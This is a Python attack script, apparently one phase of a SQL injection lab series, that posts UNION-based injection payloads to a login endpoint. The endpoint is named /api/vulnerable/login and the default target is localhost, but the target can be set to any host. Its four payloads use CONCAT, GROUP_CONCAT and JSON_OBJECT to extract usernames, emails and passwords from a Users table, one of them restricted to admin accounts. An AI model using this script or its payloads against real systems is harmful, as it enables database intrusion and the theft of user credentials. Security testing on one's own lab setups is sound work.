#!/usr/bin/env python3
"""Phase 5: Advanced Data Extraction - CONCAT & GROUP_CONCAT"""

import requests
import argparse


class Phase5AdvancedExtraction:
    def __init__(self, target="http://localhost:5001"):
        self.target = target

    def extract(self, name, payload):
        try:
            data = {"username": payload, "password": "test"}
            response = requests.post(
                f"{self.target}/api/vulnerable/login", json=data, timeout=5)

            if response.status_code == 200:
                print(f"  ✅ {name}")
                try:
                    print(f"     Response: {response.json()}")
                except:
                    print(f"     Response: {response.text[:200]}")
                return True
            else:
                print(f"  ❌ {name}")
                return False
        except Exception as e:
            print(f"  ❌ {name} - Error: {str(e)}")
            return False

    def run(self):
        print("\n" + "="*70)
        print("PHASE 5: ADVANCED DATA EXTRACTION")
        print("="*70)
        print(f"Target: {self.target}\n")

        tests = [
            ("CONCAT Users", "' UNION SELECT CONCAT(username, ':', email, ':', password), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users --"),
            ("GROUP_CONCAT All Users", "' UNION SELECT GROUP_CONCAT(CONCAT(username, '|', email, '|', password) SEPARATOR '; '), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users --"),
            ("JSON Format", "' UNION SELECT JSON_OBJECT('user', username, 'email', email, 'password', password), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users WHERE role='admin' --"),
            ("MD5 Hash of Passwords", "' UNION SELECT CONCAT(username, ':', MD5(password)), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users --"),
        ]

        for name, payload in tests:
            self.extract(name, payload)
            print()

        print("="*70)
        print("✅ Phase 5 Complete")
        print("="*70)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5001")
    args = parser.parse_args()
    phase = Phase5AdvancedExtraction(target=args.target)
    phase.run()
